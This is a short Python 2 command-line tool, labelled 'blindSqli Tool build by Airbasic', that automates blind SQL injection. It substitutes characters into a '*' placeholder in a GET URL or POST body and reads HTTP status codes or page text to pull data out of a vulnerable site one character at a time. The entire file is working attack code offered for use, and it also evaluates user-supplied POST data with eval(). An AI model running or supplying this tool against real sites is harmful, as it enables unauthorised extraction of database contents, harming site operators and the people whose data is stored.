import urllib,urllib2,sys,getopt
#blindSqli Tool build by Airbasic
global urlParam,dataParam,typeParam,passParam
urlParam = ""
dataParam = ""
typeParam = ""
passParam = ""
charList = "abcdefghijklmnopqrstuvwxyz0123456789-_.@"
def getParam():
	global urlParam,dataParam,typeParam,passParam
	opts,args = getopt.getopt(sys.argv[1:],"hu:d:t:p:")
	for op,value in opts:
		if op == "-h":
			showUsage()
		elif op == "-u":
			urlParam = value
		elif op == "-d":
			dataParam = value
		elif op == "-t":
			typeParam = value
		elif op == "-p":
			passParam = value
	if urlParam == "" or typeParam =="" or passParam == "":
		showUsage()
	print "URL:"+urlParam

def showUsage():
	print 'BlindSqli Tester Usage'
	print sys.argv[0]+' -u URL -d {POST} -t httpCode/sourceCode -p PASS_SYMBOL'
	sys.exit()

def blindSqli():
	global urlParam,dataParam,typeParam,passParam
	print 'DATA:',
	noResult = 'false'
	while 1:
		for aChar in charList:
			if dataParam != "":
				callback = postInj(urlParam,aChar)
			else:
				callback = getInj(urlParam,aChar)
			if callback == "pass":
				print aChar,
				#change the payload , add achar to it
				changePayload(aChar)
				continue
			else:
				#this char is not true
				print ".",
			#if no pass use symbol to show error
			noResult = 'true'
		if noResult == 'true':
			noResult = 'false'
			print '\nIt seems over or no more char detected , thx for using'
			sys.exit()
		

def postInj(PurlParam,PaChar):
	global urlParam,dataParam,typeParam,passParam
	postData = eval(dataParam)
	for name in postData:
		postData[name] = postData[name].replace('*',PaChar)
	postDataEnc = urllib.urlencode(postData)
	req = urllib2.Request(urlParam,postDataEnc)

	if typeParam == "httpCode":
		httpCode = urllib2.urlopen(req,timeout=8).getcode()
		if str(passParam) in str(httpCode):
			return 'pass'
		else:
			return 'false'

	if typeParam == "sourceCode":
		try:
			sourceCode = urllib2.urlopen(req,timeout=8).read()
			if str(passParam) in str(sourceCode):
				return 'pass'
			else:
				return 'false'
		except:
			print '\nError!'
			return 'false'

def getInj(PurlParam,PaChar):
	global urlParam,dataParam,typeParam,passParam
	testUrl = urlParam.replace('*',PaChar)
	if typeParam == "httpCode":
		httpCode = urllib2.urlopen(testUrl,timeout=8).getcode()
		if str(passParam) in str(httpCode):
			return 'pass'
		else:
			return 'false'
			

	if typeParam == "sourceCode":
		try:
			sourceCode = urllib2.urlopen(testUrl,timeout=8).read()
			if str(passParam) in str(sourceCode):
				return 'pass'
			else:
				return 'false'
		except:
			print '\nError!'
			return 'false'

def changePayload(PaChar):
	global urlParam,dataParam,typeParam,passParam
	if dataParam == "":
		urlParam = urlParam.replace('*',PaChar+'*')
	else:
		dataParam = dataParam.replace('*',PaChar+'*')


getParam()
blindSqli()
